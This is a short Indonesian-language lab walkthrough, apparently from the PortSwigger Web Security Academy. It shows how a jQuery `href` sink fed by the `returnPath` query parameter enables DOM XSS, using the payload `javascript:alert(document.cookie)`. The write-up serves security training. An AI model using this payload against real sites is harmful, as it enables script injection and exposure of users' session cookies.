# DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

kerentanan cross-site scripting berbasis DOM pada halaman pengiriman umpan balik. Kerentanan ini menggunakan pustaka jQuery. `$` fungsi selektor untuk menemukan elemen anchor, dan mengubah atribut `href`  menggunakan data dari `location.search`. 


Contoh kode di inspect :

```html
<div class="is-linkback">
<a id="backLink" href="/1amkaiz3n">Back</a>
</div>
```

## Cara Inject

1. Pada halaman Submit feedback, ubah parameter kueri. `returnPath` ke `/` diikuti oleh rangkaian alfanumerik acak.Contoh `1amkaiz3n`
   - `https://0ab6009404924b9d8088030c00c600d7.web-security-academy.net/feedback?returnPath=1amkaiz3n`
2. Klik kanan dan periksa elemen tersebut, lalu perhatikan bahwa string acak Anda telah ditempatkan di dalam sebuah tanda a. `href` atribut.
   - `<a id="backLink" href="/1amkaiz3n">Back</a>`
3. Mengubah returnPath ke:
  `javascript:alert(document.cookie)`
4. Lihat di inspect akan seprti ini :
   - `<a id="backLink" href="javascript:alert(document.cookie)">Back</a>`
  Tekan enter dan klik "Back".
